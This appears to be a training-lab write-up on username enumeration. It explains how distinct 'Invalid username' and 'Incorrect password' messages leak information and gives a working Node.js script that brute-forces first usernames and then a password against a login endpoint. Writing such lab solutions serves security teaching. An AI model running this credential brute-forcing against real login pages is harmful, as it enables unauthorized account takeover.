# 1 - Username Enumeration

### Notes

The app returns "Invalid username" or "Incorrect password" rather than a generic authentication failure message, allowing a valid username to be brute forced from a word list, followed by the valid password for this username. The trickiest part about this challenge is writing the script, but it is easy to solve using Burp Suite's "Intruder".

### Scripted Solution

```javascript
const fs = require('fs')
const axios = require('axios').default
require('dotenv').config({ path: './.env' })

/**
 * Loops through provided `wordList` by `step`, calling the `axiosCallback` and
 * checking result against the `matchCallback`.
 */
async function bruteForce(wordList, step, axiosCallback, matchCallback) {
  const wordListLength = wordList.length
  let from = 0,
    to = step
  let resultsAccumulator = []

  while (true) {
    const wordsSlice = wordList.slice(from, to)

    await Promise.all(wordsSlice.map((item) => axiosCallback(item))).then(
      (results) => {
        results.forEach((result) => {
          const match = matchCallback(result)
          if (match) resultsAccumulator.push(match)
        })
      }
    )

    if (to >= wordListLength) break

    from = to
    to = to + step > wordListLength ? wordListLength : to + step
  }

  return resultsAccumulator
}

/**
 * Run exploit.
 */
async function main() {
  const labUrl = process.env.LAB_URL
  const loginUrl = `${labUrl}/login`
  const usernamesTxt = fs.readFileSync(`./usernames.txt`, 'utf8')
  const usernames = usernamesTxt.split('\n')
  const passwordsTxt = fs.readFileSync(`./passwords.txt`, 'utf8')
  const passwords = passwordsTxt.split('\n')

  console.log('Brute forcing valid usernames...')
  const validUsernames = await bruteForce(
    usernames,
    10,
    (item) =>
      axios
        .post(loginUrl, `username=${item}&password=password`)
        .then((res) => ({ username: item, res: res.data })),
    (result) => {
      const { username, res } = result
      if (!res.match(/Invalid username/)) return username
      return false
    }
  )
  console.log(validUsernames)

  console.log(
    `Brute forcing valid password for username: ${validUsernames[0]}.`
  )
  const validPasswords = await bruteForce(
    passwords,
    10,
    (item) =>
      axios
        .post(loginUrl, `username=${validUsernames[0]}&password=${item}`)
        .then((res) => ({ password: item, res: res.data })),
    (result) => {
      const { password, res } = result
      if (!res.match(/Incorrect password/)) return password
      return false
    }
  )
  console.log(validPasswords)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
